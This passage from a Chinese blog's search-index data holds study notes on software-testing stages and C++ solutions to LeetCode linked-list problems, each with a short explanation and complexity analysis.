软件测试\n\n单元测试\n\n驱动程序：接收测试数据，传递给被测试的模块，并且印出有关的结果\n存根程序：代替被测试的模块所调用的模块\n\n\n集成测试\n\n集成测试更多用于测试各模块之间的接口是否正确\n\n\n\n功能性测试：使用黑盒测试技术针对被测模块的接口规格说明进行测试\n\n\n非渐增式测试方法：先分别测试每个模块，再把所有模块按设计要求放在一起\n\n看似省了步骤，但是由于其复杂性导致不可操作\n\n\n\n渐增式测试方法:把下个要测试的模块同已测试好的模块结合起来测试\n\n自顶向下\n\n深度优先：先组装在软件结构的一条主控制通路上的所有模块（先深后宽）\n宽度优先：沿软件结构水平地移动，把处于同一个控制层次上的所有模块组装起来（先宽后深）\n\n\n自底向上\n\n\n\n\n\n非功能性测试：对模块的性能或可靠性进行测试\n\n\n\n\n回归测试\n重新执行已经做过的测试的某个子集。以保证上述这些变化没有带来非预期的副作用\n\n\n确认测试（系统测试）\n检查软件能否按合同要求进行工作\n\n确认测试偏向于整个大系统是否正确完成\n\n\n\n验收测试（交付测试）\n\n内部测试（Alpha测试）\n第三方测试（Beta测试）\n\n\n\n 七、软件项目管理\nWBS工作分解结构\n工作分解任务是以列来进行的：\n\n\n第一列系统\n\n\n第二列分配角色\n\n\n第三列当前角色具有的功能模块\n\n\n第四列该功能模块具体需要完成什么样的任务\n\n\n使用此方式把一个项目，按一定的原则进行分解，项目分解成任务，任务再分解成一项项工作，再把一项项工作分解到每个人的日常活动中，直到分解不下去为止\nGantt图\nGanttProject\n","tags":["Summary"]},{"title":"链表","url":"/2025/02/06/%E9%93%BE%E8%A1%A8/","content":" 链表\n 定义\n链表是一种通过指针串联在一起的线性结构，每一个节点由两部分组成，一个是数据域一个是指针域（存放指向下一个节点的指针），最后一个节点的指针域指向null（空指针的意思）\n链表中的节点在内存中不是连续分布的，是散乱分布在内存中的某地址上，分配机制取决于操作系统的内存管理\n\n\n双链表\n\n\n\n循环链表\n\n\n\n定义链表\n\n//单链表(C++)struct ListNode &#123;    int val;//节点上存储的元素    ListNode *next;//指向下一个节点的指针    ListNode(int x):val(x),next(NULL)&#123;&#125;//节点的构造函数&#125;;//单链表(C)typedef struct ListNodeT &#123;    int val;    struct ListNodeT next;&#125;ListNode;\n\n性能分析\n\n\n\n\n\n插入/删除（时间复杂度）\n查询（时间复杂度）\n适用场景\n\n\n\n\n数组\nO(n)\nO(1)\n数据量固定，频繁查询，较少增删\n\n\n链表\nO(1)\nO(n)\n数据量不固定，频繁增删，较少查询\n\n\n\n 移除链表元素\n203. 移除链表元素\n 直接删除\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* removeElements(ListNode* head, int val) &#123;        while(head!=NULL&amp;&amp;head-&gt;val==val)&#123;//不是if防止链表元素都是val            ListNode*tmp=head;//释放空间            head=head-&gt;next;            delete tmp;        &#125;        ListNode* slt=head;        while(slt!=NULL&amp;&amp;slt-&gt;next!=NULL)&#123;            if(slt-&gt;next-&gt;val==val)&#123;                ListNode*tmp=slt-&gt;next;                slt-&gt;next=slt-&gt;next-&gt;next;                delete tmp;            &#125;else&#123;                slt=slt-&gt;next;            &#125;        &#125;        return head;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 设置一个虚拟头结点\n统一了移除链表头结点和其他结点的方式，最后return dummyNode-&gt;next\n\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* removeElements(ListNode* head, int val) &#123;        ListNode* dummyNode=new ListNode(0);        dummyNode-&gt;next=head;        ListNode* slt=dummyNode;        while(slt!=NULL&amp;&amp;slt-&gt;next!=NULL)&#123;            if(slt-&gt;next-&gt;val==val)&#123;                ListNode*tmp=slt-&gt;next;                slt-&gt;next=slt-&gt;next-&gt;next;                delete tmp;            &#125;else&#123;                slt=slt-&gt;next;            &#125;        &#125;        return dummyNode-&gt;next;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 递归法\n基础情况：对于空链表，不需要移除元素\n递归情况：首先检查头节点的值是否为val，如果是则移除头节点，答案即为在头节点的后续节点上递归的结果；如果头节点的值不为val，则答案为头节点与在头节点的后续节点上递归得到的新链表拼接的结果\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* removeElements(ListNode* head, int val) &#123;        //基础情况：空链表        if(head==nullptr)&#123;            return nullptr;        &#125;        //递归处理        if(head-&gt;val==val)&#123;            ListNode* newHead=removeElements(head-&gt;next,val);            delete head;            return newHead;        &#125;else&#123;            head-&gt;next=removeElements(head-&gt;next,val);            return head;        &#125;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(n)\n\n 设计链表\n707. 设计链表\n 单链表\n\ndelete\n\nclass MyLinkedList &#123;public:    struct LinkNode&#123;        int val;        LinkNode* next;        LinkNode(int val):val(val),next(nullptr)&#123;&#125;    &#125;;    MyLinkedList() &#123;        size=0;        dummyHead=new LinkNode(0);    &#125;        int get(int index) &#123;        if(index&lt;0||index&gt;(size-1))&#123;            return -1;        &#125;        LinkNode* slt=dummyHead-&gt;next;        while(index--)&#123;            slt=slt-&gt;next;        &#125;        return slt-&gt;val;    &#125;        void addAtHead(int val) &#123;        LinkNode* newheadnode=new LinkNode(val);        newheadnode-&gt;next=dummyHead-&gt;next;        dummyHead-&gt;next=newheadnode;        size++;    &#125;        void addAtTail(int val) &#123;        LinkNode* newtailnode=new LinkNode(val);        LinkNode* slt=dummyHead;        while(slt-&gt;next!=nullptr)&#123;            slt=slt-&gt;next;        &#125;        slt-&gt;next=newtailnode;        size++;    &#125;        void addAtIndex(int index, int val) &#123;        if(index&gt;size)&#123;            return;        &#125;        if(index&lt;0)&#123;            index=0;        &#125;        LinkNode* newnode=new LinkNode(val);        LinkNode* slt=dummyHead;        while(index--)&#123;            slt=slt-&gt;next;        &#125;        newnode-&gt;next=slt-&gt;next;        slt-&gt;next=newnode;        size++;    &#125;        void deleteAtIndex(int index) &#123;        if(index&gt;size||index&lt;0)&#123;            return;        &#125;        LinkNode* slt=dummyHead;        while(index--)&#123;            slt=slt-&gt;next;        &#125;        LinkNode* tmp=slt-&gt;next;        slt-&gt;next=slt-&gt;next-&gt;next;        delete tmp;        //注意及时赋予nullptr！        tmp=nullptr;        size--;    &#125;    void printMyLinkedList()&#123;        LinkNode* slt=dummyHead;        while(slt-&gt;next!=nullptr)&#123;            cout&lt;&lt;slt-&gt;next-&gt;val&lt;&lt;&quot; &quot;;            slt=slt-&gt;next;        &#125;        cout&lt;&lt;endl;    &#125;private:    int size;    LinkNode* dummyHead;&#125;;/** * Your MyLinkedList object will be instantiated and called as such: * MyLinkedList* obj = new MyLinkedList(); * int param_1 = obj-&gt;get(index); * obj-&gt;addAtHead(val); * obj-&gt;addAtTail(val); * obj-&gt;addAtIndex(index,val); * obj-&gt;deleteAtIndex(index); */\n\n时间复杂度：涉及index的相关操作为O(index)，其余为O(1)\n空间复杂度：O(n)\n\n 双链表\n\naddAtHead额外new tmp\n\nclass MyLinkedList &#123;public:    struct DList&#123;        int info;        DList* llink;        DList* rlink;        DList(int info):info(info),llink(nullptr),rlink(nullptr)&#123;&#125;;    &#125;;    MyLinkedList() &#123;        size=0;        sentinelnode=new DList(0);//创建哨兵节点，不存储有效数据        sentinelnode-&gt;rlink=sentinelnode;        sentinelnode-&gt;llink=sentinelnode;    &#125;        int get(int index) &#123;        if(index&lt;0||index&gt;(size-1))&#123;            return -1;        &#125;        int mid=size&gt;&gt;1;//计算链表中部位置        DList* slt=sentinelnode;        if(index&lt;mid)&#123;//从前往后遍历            for(int i=0;i&lt;index+1;i++)&#123;                slt=slt-&gt;rlink;            &#125;        &#125;else&#123;//从后往前遍历            for(int i=0;i&lt;size-index;i++)&#123;                slt=slt-&gt;llink;            &#125;        &#125;        return slt-&gt;info;    &#125;        void addAtHead(int val) &#123;        DList* newnode=new DList(val);        DList* next=sentinelnode-&gt;rlink;        newnode-&gt;llink=sentinelnode;        newnode-&gt;rlink=next;        size++;        sentinelnode-&gt;rlink=newnode;        next-&gt;llink=newnode;    &#125;        void addAtTail(int val) &#123;        DList* newnode=new DList(val);        DList* pre=sentinelnode-&gt;llink;        newnode-&gt;llink=pre;        newnode-&gt;rlink=sentinelnode;        size++;        sentinelnode-&gt;llink=newnode;        pre-&gt;rlink=newnode;    &#125;        void addAtIndex(int index, int val) &#123;        if(index&gt;size)&#123;            return;        &#125;        if(index&lt;=0)&#123;            addAtHead(val);            return;        &#125;        int mid=size&gt;&gt;1;        DList* slt=sentinelnode;        DList* newnode=new DList(val);        if(index&lt;mid)&#123;            for(int i=0;i&lt;index;i++)&#123;//从前往后遍历，注意这里没有+1                slt=slt-&gt;rlink;            &#125;            DList* tmp=slt-&gt;rlink;//tmp对应第n个节点            slt-&gt;rlink=newnode;            tmp-&gt;llink=newnode;            newnode-&gt;rlink=tmp;            newnode-&gt;llink=slt;        &#125;else&#123;            for(int i=0;i&lt;size-index;i++)&#123;//从后往前遍历                slt=slt-&gt;llink;            &#125;            DList* tmp=slt-&gt;llink;            slt-&gt;llink=newnode;            tmp-&gt;rlink=newnode;            newnode-&gt;llink=tmp;            newnode-&gt;rlink=slt;        &#125;        size++;    &#125;        void deleteAtIndex(int index) &#123;        if(index&lt;0||index&gt;(size-1))&#123;            return;        &#125;        int mid=size&gt;&gt;1;        DList* slt=sentinelnode;        if(index&lt;mid)&#123;            for(int i=0;i&lt;index;i++)&#123;                slt=slt-&gt;rlink;            &#125;            DList* next=slt-&gt;rlink-&gt;rlink;            delete slt-&gt;rlink;            slt-&gt;rlink=next;            next-&gt;llink=slt;        &#125;else&#123;            for(int i=0;i&lt;size-index-1;i++)&#123;//注意-1                slt=slt-&gt;llink;            &#125;            DList* pre=slt-&gt;llink-&gt;llink;            slt-&gt;llink=pre;            delete pre-&gt;rlink;            pre-&gt;rlink=slt;        &#125;        size--;    &#125;private:    int size;    DList* sentinelnode;&#125;;/** * Your MyLinkedList object will be instantiated and called as such: * MyLinkedList* obj = new MyLinkedList(); * int param_1 = obj-&gt;get(index); * obj-&gt;addAtHead(val); * obj-&gt;addAtTail(val); * obj-&gt;addAtIndex(index,val); * obj-&gt;deleteAtIndex(index); */\n\naddAtHead直接add\n\nclass MyLinkedList &#123;public:    struct DList&#123;        int info;        DList* llink;        DList* rlink;        DList(int info):info(info),llink(nullptr),rlink(nullptr)&#123;&#125;;    &#125;;    MyLinkedList() &#123;        size=0;        sentinelnode=new DList(0);//创建哨兵节点，不存储有效数据        sentinelnode-&gt;rlink=sentinelnode;        sentinelnode-&gt;llink=sentinelnode;    &#125;        int get(int index) &#123;        if(index&lt;0||index&gt;(size-1))&#123;            return -1;        &#125;        int mid=size&gt;&gt;1;//计算链表中部位置        DList* slt=sentinelnode;        if(index&lt;mid)&#123;//从前往后遍历            for(int i=0;i&lt;index+1;i++)&#123;                slt=slt-&gt;rlink;            &#125;        &#125;else&#123;//从后往前遍历            for(int i=0;i&lt;size-index;i++)&#123;                slt=slt-&gt;llink;            &#125;        &#125;        return slt-&gt;info;    &#125;        void addAtHead(int val) &#123;        DList* newnode=new DList(val);        DList* next=sentinelnode-&gt;rlink;        newnode-&gt;llink=sentinelnode;        newnode-&gt;rlink=next;        size++;        sentinelnode-&gt;rlink=newnode;        next-&gt;llink=newnode;    &#125;        void addAtTail(int val) &#123;        DList* newnode=new DList(val);        DList* pre=sentinelnode-&gt;llink;        newnode-&gt;llink=pre;        newnode-&gt;rlink=sentinelnode;        size++;        sentinelnode-&gt;llink=newnode;        pre-&gt;rlink=newnode;    &#125;        void addAtIndex(int index, int val) &#123;        if(index&gt;size)&#123;            return;        &#125;        if(index&lt;=0)&#123;            addAtHead(val);            return;        &#125;        int mid=size&gt;&gt;1;        DList* slt=sentinelnode;        DList* newnode=new DList(val);        if(index&lt;mid)&#123;            for(int i=0;i&lt;index;i++)&#123;//从前往后遍历，注意这里没有+1                slt=slt-&gt;rlink;//slt            &#125;            //后插            newnode-&gt;rlink=slt-&gt;rlink;            newnode-&gt;llink=slt;            slt-&gt;rlink-&gt;llink=newnode;            slt-&gt;rlink=newnode;        &#125;else&#123;            for(int i=0;i&lt;size-index;i++)&#123;//从后往前遍历                slt=slt-&gt;llink;            &#125;            //前插            newnode-&gt;rlink=slt;            newnode-&gt;llink=slt-&gt;llink;            slt-&gt;llink-&gt;rlink=newnode;            slt-&gt;llink=newnode;        &#125;        size++;    &#125;        void deleteAtIndex(int index) &#123;        if(index&lt;0||index&gt;(size-1))&#123;            return;        &#125;        int mid=size&gt;&gt;1;        DList* slt=sentinelnode;        if(index&lt;mid)&#123;            for(int i=0;i&lt;index;i++)&#123;                slt=slt-&gt;rlink;            &#125;            DList* next=slt-&gt;rlink-&gt;rlink;            delete slt-&gt;rlink;            slt-&gt;rlink=next;            next-&gt;llink=slt;        &#125;else&#123;            for(int i=0;i&lt;size-index-1;i++)&#123;//注意-1                slt=slt-&gt;llink;            &#125;            DList* pre=slt-&gt;llink-&gt;llink;            slt-&gt;llink=pre;            delete pre-&gt;rlink;            pre-&gt;rlink=slt;        &#125;        size--;    &#125;private:    int size;    DList* sentinelnode;&#125;;/** * Your MyLinkedList object will be instantiated and called as such: * MyLinkedList* obj = new MyLinkedList(); * int param_1 = obj-&gt;get(index); * obj-&gt;addAtHead(val); * obj-&gt;addAtTail(val); * obj-&gt;addAtIndex(index,val); * obj-&gt;deleteAtIndex(index); */\n 反转链表\n206. 反转链表\n 双指针法\n链表逆置详细讲解（图文）\n当slt为空的时候循环结束，不断将slt指向pre\n\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* reverseList(ListNode* head) &#123;        ListNode* tmp;        ListNode* slt=head;        ListNode* pre=nullptr;        while(slt)&#123;            tmp=slt-&gt;next;            slt-&gt;next=pre;            pre=slt;            slt=tmp;        &#125;        return pre;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 递归法\n\n从前往后\n\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* reverseList(ListNode* head) &#123;        return reverse(NULL,head);    &#125;    ListNode* reverse(ListNode* pre,ListNode* slt)&#123;        if(slt==NULL)&#123;            return pre;        &#125;        ListNode* tmp=slt-&gt;next;        slt-&gt;next=pre;        return reverse(slt,tmp);    &#125;&#125;;\n\n\n时间复杂度：O(n)，要递归处理链表的每个节点\n\n\n空间复杂度：O(n)，递归调用了n层栈空间\n\n\n从后往前\n\n\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* reverseList(ListNode* head) &#123;        if(head==NULL)&#123;            return NULL;        &#125;        if(head-&gt;next==NULL)&#123;            return head;        &#125;        //递归调用，翻转第二个节点开始往后的链表        ListNode* last=reverseList(head-&gt;next);        //翻转头节点与第二个节点的指向        head-&gt;next-&gt;next=head;        //此时的head节点为尾节点，next需要指向NULL        head-&gt;next=NULL;        return last;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(n)\n\n 两两交换链表中的节点\n24. 两两交换链表中的节点\n\n交换相邻两个元素时建议一定要画图，搞清操作指针的前后顺序\n\n\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* swapPairs(ListNode* head) &#123;        ListNode* dummyHead=new ListNode(0);        dummyHead-&gt;next=head;        ListNode* slt=dummyHead;        while(slt-&gt;next!=nullptr&amp;&amp;slt-&gt;next-&gt;next!=nullptr)&#123;            ListNode* tmp=slt-&gt;next;            ListNode* tmp1=slt-&gt;next-&gt;next-&gt;next;            slt-&gt;next=slt-&gt;next-&gt;next;            slt-&gt;next-&gt;next=tmp;            slt-&gt;next-&gt;next-&gt;next=tmp1;            slt=slt-&gt;next-&gt;next;        &#125;        return dummyHead-&gt;next;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 删除链表的倒数第N个节点\n19. 删除链表的倒数第 N 个结点\n双指针的经典应用\n如果要删除倒数第n个节点，让fast移动n步，然后让fast和slow同时移动，直到fast指向链表末尾。删掉slow所指向的节点就可以了\n\nfast首先走n+1步\n这样同时移动的时候slow才能指向删除节点的上一个节点（方便做删除操作）\n\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode() : val(0), next(nullptr) &#123;&#125; *     ListNode(int x) : val(x), next(nullptr) &#123;&#125; *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode* removeNthFromEnd(ListNode* head, int n) &#123;        ListNode* dummyHead=new ListNode(0);        dummyHead-&gt;next=head;        ListNode* slow=dummyHead;        ListNode* fast=dummyHead;        while(n--&amp;&amp;fast!=nullptr)&#123;            fast=fast-&gt;next;        &#125;        fast=fast-&gt;next;//fast再走一步使slow指向删除节点的上一个节点        while(fast!=nullptr)&#123;            fast=fast-&gt;next;            slow=slow-&gt;next;        &#125;        ListNode *tmp=slow-&gt;next;        slow-&gt;next=slow-&gt;next-&gt;next;        delete tmp;        return dummyHead-&gt;next;    &#125;&#125;;\n\n时间复杂度：O(n)\n空间复杂度：O(1)\n\n 相交链表\n160. 相交链表\n求出两个链表的长度，并求出两个链表长度的差值，然后让slta移动到和sltb末尾对齐的位置\n此时我们就可以比较slta和sltb是否相同，如果不相同，同时向后移动slta和sltb，如果遇到slta==sltb，则找到交点，否则循环退出返回空指针\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode *getIntersectionNode(ListNode *headA, ListNode *headB) &#123;        ListNode* slta=headA;        ListNode* sltb=headB;        int lena=0,lenb=0;        while(slta!=nullptr)&#123;            lena++;            slta=slta-&gt;next;        &#125;        while(sltb!=nullptr)&#123;            lenb++;            sltb=sltb-&gt;next;        &#125;        slta=headA;        sltb=headB;        if(lenb&gt;lena)&#123;//让slta为最长链表的头            swap(lena,lenb);            swap(slta,sltb);        &#125;        int gap=lena-lenb;        while(gap--)&#123;            slta=slta-&gt;next;        &#125;        while(slta!=nullptr)&#123;            if(slta==sltb)&#123;                return slta;            &#125;            slta=slta-&gt;next;            sltb=sltb-&gt;next;        &#125;        return nullptr;    &#125;&#125;;\n\n时间复杂度：O(n+m)\n空间复杂度：O(1)\n\n 环形链表II\n142. 环形链表 II\n\n判断链表是否有环\n\n使用快慢指针法，分别定义fast和slow指针，从头结点出发，fast指针每次移动两个节点，slow指针每次移动一个节点，如果fast和slow指针在途中相遇，说明这个链表有环\n\n\n找到这个环的入口\n\n假设从头结点到环形入口节点的节点数为x。环形入口节点到fast指针与slow指针相遇节点节点数为y。从相遇节点再到环形入口节点节点数为z\n\n相遇时slow指针走过了x+y，fast指针走过了x+y+n(y+z)\n\nn为fast在环内走了n圈遇到slow指针\n\n有关系fast走的节点是slow的两倍，此时(x+y)*2=x+y+n(y+z)\n得到x=n(y+z)-y，提出一个y+z，整理得x=(n-1)(y+z)+z\n\nn为1\n\nfast指针在环形里转了一圈就遇到了slow指针，此时x=z\n有：从头结点出发一个指针，从相遇节点也出发一个指针，这两个指针每次只走一个节点，那么当这两个指针相遇的时候就是环形入口的节点\n可在相遇节点处，定义一个指针index1，在头结点处定一个指针index2\nindex1和index2同时移动，每次移动一个节点，那么他们相遇的地方就是环形入口的节点\n\n\nn&gt;1\n\nfast指针在环形转n圈之后才遇到slow指针\n此时index1指针在环里多转了(n-1)圈然后再遇到index2，相遇点依然是环形的入口节点\n/** * Definition for singly-linked list. * struct ListNode &#123; *     int val; *     ListNode *next; *     ListNode(int x) : val(x), next(NULL) &#123;&#125; * &#125;; */class Solution &#123;public:    ListNode *detectCycle(ListNode *head) &#123;        ListNode* fast=head;        ListNode* slow=head;        while(fast!=nullptr&amp;&amp;fast-&gt;next!=nullptr)&#123;            slow=slow-&gt;next;            fast=fast-&gt;next-&gt;next;            if(slow==fast)&#123;                ListNode* index1=fast;                ListNode* index2=head;                while(index1!=index2)&#123;                    index1=index1-&gt;next;                    index2=index2-&gt;next;                &#125;                return index1;            &#125;        &#125;        return nullptr;    &#125;&#125;;\n\n\n时间复杂度：O(n)\n快慢指针相遇前，指针走的次数小于链表长度，快慢指针相遇后，两个index指针走的次数也小于链表长度，总体为走的次数小于2n\n\n\n空间复杂度：O(1)\n\n\n","tags":["LeetCode"]}]